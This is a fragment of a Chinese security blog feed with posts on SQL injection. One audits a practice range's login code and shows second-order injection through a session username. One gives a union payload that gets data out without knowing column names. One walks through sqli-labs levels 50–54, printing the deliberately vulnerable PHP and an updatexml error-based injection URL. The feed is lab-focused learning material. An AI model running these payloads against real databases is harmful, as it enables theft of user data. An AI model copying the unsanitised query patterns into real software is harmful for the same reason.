src="https://s2.ax1x.com/2019/02/16/ksNszj.png" alt="ksNszj.png"></p><p><img src="https://s2.ax1x.com/2019/02/16/ksNTSJ.png" alt="ksNTSJ.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>V shot field user login second injection</title>
      <link href="/posts/8c872ea6.html"/>
      <url>/posts/8c872ea6.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>干完事情去审计靶场里的代码，发现了一处二次注入。作者真的是懒！</p><p><img src="https://p1.pstatp.com/large/pgc-image/1541084522477aa34df26b3?/1.jpg" alt="1.jpg"></p><p><b>BGM 哑巴:<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=557583281&auto=1&height=66"></iframe><br></b></p><h2 id="V靶场用户登录处二次注入"><a href="#V靶场用户登录处二次注入" class="headerlink" title="V靶场用户登录处二次注入"></a>V靶场用户登录处二次注入</h2><hr><p>先看user文件夹里面的<br>regCheck.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'../sys/config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'user'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($_POST[<span class="string">'user'</span>])&gt;<span class="number">16</span>) &#123;</span><br><span class="line">$_SESSION[<span class="string">'error_info'</span>] = <span class="string">'用户名過長（用戶名長度&lt;=16）'</span>;</span><br><span class="line">header(<span class="string">'Location: reg.php'</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//过滤输入变量</span></span><br><span class="line">$clean_name = clean_input($_POST[<span class="string">'user'</span>]);</span><br><span class="line">$clean_pass = clean_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line">$avatar = <span class="string">'../images/default.jpg'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断用户名已是否存在</span></span><br><span class="line">$query = <span class="string">"SELECT * FROM users WHERE user_name = '$clean_name'"</span>;</span><br><span class="line">    $data = mysql_query($query, $conn);</span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows($data) == <span class="number">1</span>) &#123;</span><br><span class="line">$_SESSION[<span class="string">'error_info'</span>] = <span class="string">'用户名已存在'</span>;</span><br><span class="line">header(<span class="string">'Location: reg.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//添加用户</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$_SESSION[<span class="string">'username'</span>] = $clean_name;</span><br><span class="line">$_SESSION[<span class="string">'avatar'</span>] = $avatar;</span><br><span class="line">$date = date(<span class="string">'Y-m-d'</span>);</span><br><span class="line">$query = <span class="string">"INSERT INTO users(user_name,user_pass,user_avatar,join_date) VALUES ('$clean_name',SHA('$clean_pass'),'$avatar','$date')"</span>;</span><br><span class="line">mysql_query($query, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Error!!"</span>);</span><br><span class="line">header(<span class="string">'Location: user.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">not_find($_SERVER[<span class="string">'PHP_SELF'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>logCheck.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'../sys/config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'user'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'pass'</span>])) &#123;</span><br><span class="line">$clean_name = clean_input($_POST[<span class="string">'user'</span>]);</span><br><span class="line">$clean_pass = clean_input($_POST[<span class="string">'pass'</span>]);</span><br><span class="line">    $query = <span class="string">"SELECT * FROM users WHERE user_name = '$clean_name' AND user_pass = SHA('$clean_pass')"</span>;</span><br><span class="line">    $data = mysql_query($query, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'Error!!'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mysql_num_rows($data) == <span class="number">1</span>) &#123;</span><br><span class="line">        $row = mysql_fetch_array($data);</span><br><span class="line">$_SESSION[<span class="string">'username'</span>] = $row[<span class="string">'user_name'</span>];</span><br><span class="line">$_SESSION[<span class="string">'avatar'</span>] = $row[<span class="string">'user_avatar'</span>];</span><br><span class="line">$ip = sqlwaf(get_client_ip());</span><br><span class="line">$query = <span class="string">"UPDATE users SET login_ip = '$ip' WHERE user_id = '$row[user_id]'"</span>;</span><br><span class="line">mysql_query($query, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"updata error!"</span>);</span><br><span class="line">        header(<span class="string">'Location: user.php'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        $query = <span class="string">"SELECT * FROM users WHERE user_name = '$clean_name' AND user_pass = SHA('$clean_pass')"</span>;</span><br><span class="line">$_SESSION[<span class="string">'error_info'</span>] = <span class="string">'用户名或密码错误,查询的语句是：'</span>.$query;</span><br><span class="line">header(<span class="string">'Location: login.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">not_find($_SERVER[<span class="string">'PHP_SELF'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>user.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'../sys/config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>( $_SESSION[<span class="string">'username'</span>] ) ) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'../header.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>( $SESSION[<span class="string">'user_id'</span>] ) ) &#123;</span><br><span class="line">$query = <span class="string">"SELECT * FROM users WHERE user_name = '&#123;$_SESSION['username']&#125;'"</span>; <span class="comment">/*没对$_session['username']做任何过滤，存在注入*/</span></span><br><span class="line">        <span class="keyword">echo</span> $query;</span><br><span class="line">$data = mysql_query( $query, $conn ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'Error!!'</span> );</span><br><span class="line">mysql_close( $conn );</span><br><span class="line">$result = mysql_fetch_array( $data );</span><br><span class="line">$_SESSION[<span class="string">'user_id'</span>] = $result[<span class="string">'user_id'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$html_avatar = htmlspecialchars( $_SESSION[<span class="string">'avatar'</span>] );</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div class="row"&gt;</span><br><span class="line">&lt;div style=<span class="string">"float:left;"</span>&gt;</span><br><span class="line">&lt;img src="avatar.php" width="100" height="100" class="img-thumbnail" &gt;</span><br><span class="line">&lt;div class="text-center"&gt;&lt;?php echo $_SESSION['username']?&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=<span class="string">"float:right;padding-right:900px"</span>&gt;</span><br><span class="line">&lt;div&gt;&lt;a href="logout.php"&gt;&lt;button type="button" class="btn btn-primary"&gt;退出&lt;/button&gt;&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;div&gt;&lt;a href="edit.php"&gt;&lt;button type="button" class="btn btn-primary"&gt;编辑&lt;/button&gt;&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;div&gt;&lt;a href="../message.php"&gt;&lt;button type="button" class="btn btn-primary"&gt;发留言&lt;/button&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../footer.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">not_find( $_SERVER[<span class="string">'PHP_SELF'</span>] );</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><b>整体思路</b><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注册用户名的时候，如果注册成功就将注册的用户名带入session然后在写入数据库里，然后跳转到user.php里面进行查询。</span><br><span class="line">虽然user.php的查询没有做过滤$_SESSION[&apos;username&apos;]但是由于注册的哪里做了SQL过滤。所以带入sesion的时候已经被过滤了，所以注入不了</span><br><span class="line">然后进行退出，重新登陆，虽然登录哪里做了过滤但是用户名成功查询到了，然后将查询到的用户名</span><br><span class="line">带入session然后跳到user.php里面进行查询，由于直接将查询成功的用户名带入user.php查询中途没做任何过滤，user.php也没有过滤所以导致二次注入</span><br></pre></td></tr></table></figure></p><p><b>实验</b><br>PS：首先说一下这个靶场的坑b之处，只要语句查询成功就不输出Error，是输出error不是mysql报错<br>也就是说完全是用来测试二次注入的。。这作者得挨打</p><p>先注册一个a’的用户名<br>下图为注册成功后调整到user.php<br><img src="https://s2.ax1x.com/2019/02/15/krwiKs.md.png" alt="krwiKs.md.png"></p><p>处理注册的php<br><img src="https://s2.ax1x.com/2019/02/15/krwkbq.png" alt="krwkbq.png"></p><p>退出重新登陆<br><img src="https://s2.ax1x.com/2019/02/15/krwZ5T.png" alt="krwZ5T.png"></p><p>处理登陆的php<br><img src="https://s2.ax1x.com/2019/02/15/krwmPU.png" alt="krwmPU.png"></p><p>这里的查询语句输出我自己加上去的，方便看效果</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SQL injection without getting the column name</title>
      <link href="/posts/f0db9a18.html"/>
      <url>/posts/f0db9a18.html</url>
      <content type="html"><![CDATA[<h2 id="在无法得到列名下进行注入"><a href="#在无法得到列名下进行注入" class="headerlink" title="在无法得到列名下进行注入"></a>在无法得到列名下进行注入</h2><p><b>BGM：Welcome to Planet Urf</b><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=31311706&auto=1&height=66"></iframe></p><hr><p>从这篇文章学习的：<a href="https://nosec.org/home/detail/2245.html" target="_blank" rel="noopener">如何在不知道MySQL列名的情况下注入出数据？|NOSEC安全讯息平台 - NOSEC.ORG</a></p><p>此方法适用于以下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">盲注的时候跑不出列名</span><br></pre></td></tr></table></figure></p><p>利用条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知道列名的个数</span><br></pre></td></tr></table></figure></p><p>mysql命令行测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">表名为：users</span><br><span class="line">users表里面的列名有：id,username,password</span><br><span class="line">列的个数为3 (1,2,3) (1=&gt;id,2=&gt;username,3=&gt;password)</span><br></pre></td></tr></table></figure></p><p>查询语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1</span><br></pre></td></tr></table></figure></p><p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,(select `2` from (select 1,2,3 union select * from users)a limit 1,1),3</span><br></pre></td></tr></table></figure></p><p>结果：<br><img src="https://s2.ax1x.com/2019/02/14/kDA439.png" alt="kDA439.png"></p><p>靶场测试：<br><img src="https://s2.ax1x.com/2019/02/14/kDAIj1.png" alt="kDAIj1.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli labs Less 50 -&gt; Less 54</title>
      <link href="/posts/b0e668d5.html"/>
      <url>/posts/b0e668d5.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>距离上学还有3天，今天继续闯sqli-labs靶场，从50关崩到54关，感觉可还行<br><img src="http://i0.hdslb.com/bfs/archive/5e52287fe186c4bb6a714985fb0ef5a4625558ff.jpg" alt="5e52287fe186c4bb6a714985fb0ef5a4625558ff.jpg"><br><b>BGM:喜欢</b></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=526464145&auto=1&height=66"></iframe><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><hr><p>50关代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:70px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sqli-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$id=$_GET[<span class="string">'sort'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($id))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'SORT:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users ORDER BY $id"</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;font color= <span class="string">"#00FF00"</span> size=<span class="string">"4"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;table   border=<span class="number">1</span><span class="string">'&gt;</span></span><br><span class="line"><span class="string">&lt;tr&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;/tr&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">/* store first result set */</span></span><br><span class="line"><span class="string">if ($result = mysqli_store_result($con1))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">while($row = mysqli_fetch_row($result))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo '</span>&lt;font color= <span class="string">"#00FF11"</span> size=<span class="string">"3"</span>&gt;<span class="string">';</span></span><br><span class="line"><span class="string">echo "&lt;tr&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;td&gt;";</span></span><br><span class="line"><span class="string">printf("%s", $row[0]);</span></span><br><span class="line"><span class="string">echo "&lt;/td&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;td&gt;";</span></span><br><span class="line"><span class="string">printf("%s", $row[1]);</span></span><br><span class="line"><span class="string">echo "&lt;/td&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;td&gt;";</span></span><br><span class="line"><span class="string">printf("%s", $row[2]);</span></span><br><span class="line"><span class="string">echo "&lt;/td&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;/tr&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;/font&gt;";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">echo "&lt;/table&gt;";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo '</span>&lt;font color= <span class="string">"#FFFF00"</span>&gt;<span class="string">';</span></span><br><span class="line"><span class="string">print_r(mysqli_error($con1));</span></span><br><span class="line"><span class="string">echo "&lt;/font&gt;";  </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo "Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;";</span></span><br><span class="line"><span class="string">echo "&lt;br&gt;&lt;br&gt;&lt;br&gt;";</span></span><br><span class="line"><span class="string">echo '</span>&lt;img src=<span class="string">"../images/Less-50.jpg"</span> /&gt;&lt;br&gt;<span class="string">';</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt; </span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/br&gt;</span></span><br><span class="line"><span class="string">&lt;/br&gt;</span></span><br><span class="line"><span class="string">&lt;/br&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/center&gt; </span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></p><p>还是order by注入，报错注入带走<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-50/?sort=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/14/kBzIXD.md.png" alt="kBzIXD.md.png"></p><p>51关代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:70px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sqli-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$id=$_GET[<span class="string">'sort'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($id))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'SORT:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users ORDER BY '$id'"</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql)) </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;font color= <span class="string">"#00FF00"</span> size=<span class="string">"4"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;table   border=<span class="number">1</span><span class="string">'&gt;</span></span><br><span class="line"><span class="string">&lt;tr&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;</span></span><br><span class="line"><span class="string">&lt;/tr&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt;</span></span><br><span class="line"><span class="string">&lt;/font&gt;</span></span><br><span 